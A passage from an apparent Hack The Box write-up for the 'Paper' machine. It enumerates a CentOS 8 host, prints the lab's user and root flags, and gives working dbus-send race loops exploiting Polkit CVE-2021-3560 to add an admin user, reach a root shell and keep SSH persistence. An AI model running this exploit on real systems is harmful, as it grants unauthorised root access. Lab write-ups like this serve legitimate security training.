</span><span class="z-text z-plain">BUG_REPORT_URL=&quot;https://bugs.centos.org/&quot;
</span><span class="z-text z-plain">CENTOS_MANTISBT_PROJECT=&quot;CentOS-8&quot;
</span><span class="z-text z-plain">CENTOS_MANTISBT_PROJECT_VERSION=&quot;8&quot;
</span></code></pre>
<p>Okay, so it's CentOS 8.</p>
<h3 id="kernel">Kernel</h3>
<p>Let's find the kernel version of Paper.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">4.18.0-348.7.1.el8_5.x86_64
</span></code></pre>
<p>It's <code>4.18.0</code>.</p>
<h3 id="users">Users</h3>
<p>Let's enumerate all users.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ grep <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">dwight
</span><span class="z-text z-plain">rocketchat
</span><span class="z-text z-plain">root
</span></code></pre>
<p>There's <code>dwight</code> (us), <code>rocketchat</code> and <code>root</code>.</p>
<h3 id="groups">Groups</h3>
<p>Let's enumerate all groups.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/group<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">adm
</span><span class="z-text z-plain">apache
</span><span class="z-text z-plain">audio
</span><span class="z-text z-plain">avahi
</span><span class="z-text z-plain">bin
</span><span class="z-text z-plain">brlapi
</span><span class="z-text z-plain">cdrom
</span><span class="z-text z-plain">chrony
</span><span class="z-text z-plain">clevis
</span><span class="z-text z-plain">cockpit-ws
</span><span class="z-text z-plain">colord
</span><span class="z-text z-plain">daemon
</span><span class="z-text z-plain">dbus
</span><span class="z-text z-plain">dialout
</span><span class="z-text z-plain">disk
</span><span class="z-text z-plain">dnsmasq
</span><span class="z-text z-plain">dwight
</span><span class="z-text z-plain">floppy
</span><span class="z-text z-plain">ftp
</span><span class="z-text z-plain">games
</span><span class="z-text z-plain">gdm
</span><span class="z-text z-plain">geoclue
</span><span class="z-text z-plain">gluster
</span><span class="z-text z-plain">gnome-initial-setup
</span><span class="z-text z-plain">input
</span><span class="z-text z-plain">insights
</span><span class="z-text z-plain">kmem
</span><span class="z-text z-plain">kvm
</span><span class="z-text z-plain">libstoragemgmt
</span><span class="z-text z-plain">libvirt
</span><span class="z-text z-plain">lock
</span><span class="z-text z-plain">lp
</span><span class="z-text z-plain">mail
</span><span class="z-text z-plain">man
</span><span class="z-text z-plain">mem
</span><span class="z-text z-plain">mongod
</span><span class="z-text z-plain">mysql
</span><span class="z-text z-plain">nginx
</span><span class="z-text z-plain">nobody
</span><span class="z-text z-plain">pegasus
</span><span class="z-text z-plain">pipewire
</span><span class="z-text z-plain">polkitd
</span><span class="z-text z-plain">printadmin
</span><span class="z-text z-plain">pulse
</span><span class="z-text z-plain">pulse-access
</span><span class="z-text z-plain">pulse-rt
</span><span class="z-text z-plain">qemu
</span><span class="z-text z-plain">radvd
</span><span class="z-text z-plain">render
</span><span class="z-text z-plain">rocketchat
</span><span class="z-text z-plain">root
</span><span class="z-text z-plain">rpc
</span><span class="z-text z-plain">rpcuser
</span><span class="z-text z-plain">rtkit
</span><span class="z-text z-plain">saslauth
</span><span class="z-text z-plain">setroubleshoot
</span><span class="z-text z-plain">slocate
</span><span class="z-text z-plain">ssh_keys
</span><span class="z-text z-plain">sshd
</span><span class="z-text z-plain">sssd
</span><span class="z-text z-plain">sys
</span><span class="z-text z-plain">systemd-coredump
</span><span class="z-text z-plain">systemd-journal
</span><span class="z-text z-plain">systemd-resolve
</span><span class="z-text z-plain">tape
</span><span class="z-text z-plain">tcpdump
</span><span class="z-text z-plain">tss
</span><span class="z-text z-plain">tty
</span><span class="z-text z-plain">unbound
</span><span class="z-text z-plain">usbmuxd
</span><span class="z-text z-plain">users
</span><span class="z-text z-plain">utempter
</span><span class="z-text z-plain">utmp
</span><span class="z-text z-plain">video
</span><span class="z-text z-plain">wheel
</span></code></pre>
<h3 id="nics">NICs</h3>
<p>Let's gather the list of connected NICs.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ ifconfig</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
</span><span class="z-text z-plain">        inet 10.10.11.143  netmask 255.255.254.0  broadcast 10.10.11.255
</span><span class="z-text z-plain">        inet6 dead:beef::250:56ff:feb9:da16  prefixlen 64  scopeid 0x0&lt;global&gt;
</span><span class="z-text z-plain">        inet6 fe80::250:56ff:feb9:da16  prefixlen 64  scopeid 0x20&lt;link&gt;
</span><span class="z-text z-plain">        ether 00:50:56:b9:da:16  txqueuelen 1000  (Ethernet)
</span><span class="z-text z-plain">        RX packets 1465889  bytes 214474665 (204.5 MiB)
</span><span class="z-text z-plain">        RX errors 0  dropped 27851  overruns 0  frame 0
</span><span class="z-text z-plain">        TX packets 129702  bytes 37944096 (36.1 MiB)
</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
</span><span class="z-text z-plain">        inet 127.0.0.1  netmask 255.0.0.0
</span><span class="z-text z-plain">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
</span><span class="z-text z-plain">        loop  txqueuelen 1000  (Local Loopback)
</span><span class="z-text z-plain">        RX packets 41183994  bytes 7736913664 (7.2 GiB)
</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class="z-text z-plain">        TX packets 41183994  bytes 7736913664 (7.2 GiB)
</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">virbr0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
</span><span class="z-text z-plain">        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255
</span><span class="z-text z-plain">        ether 52:54:00:9b:e7:f7  txqueuelen 1000  (Ethernet)
</span><span class="z-text z-plain">        RX packets 0  bytes 0 (0.0 B)
</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class="z-text z-plain">        TX packets 0  bytes 0 (0.0 B)
</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></code></pre>
<p>There's an Ethernet interface, the loopback interface and a virtual bridge for
QEMU.</p>
<h3 id="hostname">Hostname</h3>
<p>What is Paper's hostname?</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ hostname</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">paper
</span></code></pre>
<p>Yeah I know, very surprising.</p>
<h2 id="system-enumeration">System enumeration</h2>
<h3 id="flags">Flags</h3>
<p>If we check our home folder, we find the user flag.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/dwight/user.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">6e1587b2ba8c18faf177a08f24c2f901
</span></code></pre>
<h3 id="home-folders">Home folders</h3>
<p>If we explore our home folder, we notice a <code>poc.sh</code> file.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&lt;</span>SNIP<span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>CVE-2021-3560 Polkit v0.105-26 Linux Privilege Escalation PoC by SecNigma<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span><span class="z-source z-shell z-bash"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&lt;</span>SNIP<span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span>
</span></code></pre>
<p>It's a PoC for the
<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3560">CVE-2021-3560</a> written by the
author of this box... It has to be a hint!</p>
<h2 id="privilege-escalation-cve-2021-3560">Privilege escalation (<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3560">CVE-2021-3560</a>)</h2>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3560">CVE-2021-3560</a> is a
vulnerability in Polkit versions prior to <code>0.119</code>, a system authorization
framework that allows applications to ask for permission to perform actions that
require elevated privileges, mainly used on Linux. The vulnerability lies in
Polkit's handling of D-Bus requests, a message bus system that allows
applications to communicate with each other. When an application makes a D-Bus
request to Polkit, Polkit checks the requester's credentials to determine
whether they have the necessary permissions. However, Polkit can be tricked into
bypassing the credential checks for D-Bus requests. An attacker can craft a
D-Bus request that appears to come from a trusted application, such as the
user's desktop environment, which would grant him <code>root</code> privileges on the
system.</p>
<p>You can read more about it on
<a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/">GitHub's blog</a>.</p>
<h3 id="checks">Checks</h3>
<p>Let's check the version of Polkit installed on Paper.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ rpm<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>qa</span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>polkit<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">polkit-0.115-6.el8.x86_64
</span><span class="z-text z-plain">polkit-pkla-compat-0.1-12.el8.x86_64
</span><span class="z-text z-plain">polkit-libs-0.115-6.el8.x86_64
</span></code></pre>
<p>According to the output of this command, Polkit version <code>0.115</code> is installed, so
it should be vulnerable to this CVE!</p>
<h3 id="preparation">Preparation</h3>
<p>The box provides us with a <code>poc.sh</code> file to exploit it. I tried to exploit this
CVE manually but it failed, so I'll use it.</p>
<p>This script exploits this CVE to create a new user. Therefore, the goal will be
to create a <code>dummy</code> user with the <code>5up3rdup3r53cr37p455w0rd!</code> password.</p>
<p>However we need a password hash, and not a cleartext password, so let's hash it
with the SHA-512 algorithm:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> openssl passwd<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>6</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>5up3rdup3r53cr37p455w0rd!<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">$6$S7gVDgHvvW/e4oC1$ycineGMsXBwydZJnMTkrgd0IN7mAMhIaB/I80lbsFfg1hoBXpjanYPu3bEYoH04SSEP1WAdBQ560WtVEHRlHP1
</span></code></pre>
<h3 id="exploitation">Exploitation</h3>
<p>Let's send a D-Bus message to create a new user:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ for i in <span class="z-meta z-group z-expansion z-brace z-shell"><span class="z-punctuation z-section z-expansion z-brace z-begin z-shell">{</span>1..100<span class="z-punctuation z-section z-expansion z-brace z-end z-shell">}</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-loop z-do z-shell">do</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">                      <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">dbus-send</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>system</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>dest</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>org.freedesktop.Accounts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>type</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>method_call<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>print-reply</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/org/freedesktop/Accounts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>org.freedesktop.Accounts.CreateUser<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> string:<span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>dummy<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> string:<span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Don&#39;t mind me!<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> int32:<span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-job z-shell">&amp;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">                      <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sleep</span></span><span class="z-meta z-function-call z-arguments z-shell"> 0.005s</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">                      <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-kill z-shell">kill</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-language z-shell">!</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">                  <span class="z-keyword z-control z-loop z-end z-shell">done</span>
</span></code></pre>
<p>Our user was successfully created:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ id <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>dummy<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">uid=1005(dummy) gid=1005(dummy) groups=1005(dummy),10(wheel)
</span></code></pre>
<p>Now let's change its password to the SHA-512 hash we generated.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ for i in <span class="z-meta z-group z-expansion z-brace z-shell"><span class="z-punctuation z-section z-expansion z-brace z-begin z-shell">{</span>1..100<span class="z-punctuation z-section z-expansion z-brace z-end z-shell">}</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-loop z-do z-shell">do</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">                      <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">dbus-send</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>system</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>dest</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>org.freedesktop.Accounts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>type</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>method_call<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>print-reply</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/org/freedesktop/Accounts/User1005<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>org.freedesktop.Accounts.User.SetPassword<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> string:<span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>$6$S7gVDgHvvW/e4oC1$ycineGMsXBwydZJnMTkrgd0IN7mAMhIaB/I80lbsFfg1hoBXpjanYPu3bEYoH04SSEP1WAdBQ560WtVEHRlHP1<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span> string:<span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Don&#39;t mind me!<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-job z-shell">&amp;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">                      <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sleep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>0.005s<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">                      <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-kill z-shell">kill</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-language z-shell">!</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">                  <span class="z-keyword z-control z-loop z-end z-shell">done</span>
</span></code></pre>
<p>Finally, we can impersonate our new user:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ su - <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>dummy<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">[dummy@paper dwight]$
</span></code></pre>
<p>And then we can get a shell as <code>root</code>:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dummy@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> dwight]$ sudo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/bin/bash<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">[root@paper dummy]#
</span></code></pre>
<h3 id="establishing-persistence">Establishing persistence</h3>
<p>Let's use SSH to establish persistence.</p>
<p>Our home folder contains a <code>.ssh</code> folder. There's no existing private key, so
I'll create one, and I'll add the corresponding public key to <code>authorized_keys</code>.
Finally, I'll connect over SSH to Paper as <code>root</code>.</p>
<h2 id="system-enumeration-1">System enumeration</h2>
<p>If we run <code>whoami</code>, we see that we're <code>root</code>!</p>
<h3 id="flags-1">Flags</h3>
<p>As usual, we can find the root flag in our home folder.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[root@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]# cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/root/root.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">163d766cda80e3c5639fd6a2d95ec973
</span></code></pre>
<h1 id="afterwords">Afterwords</h1>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/success.png" alt="Success" /></p>
<p>That's it for this box! 🎉</p>
<p>I rated the user flag as 'Not too easy' and the root flag as 'Easy'. The
foothold required to identify a valid CVE among several potential ones, and then
to abuse a LFI. It was rather easy overall, albeit a bit long. The privilege
escalation was easy to find thanks to the hint in <code>dwight</code>'s home folder, but
really annoying to take advantage of, since the it relied on timings, so I had
to retry it many times.</p>
<p>Thanks for reading!</p>
</section>
</article>

    </main>

        <footer></footer>

    </body>
</html>
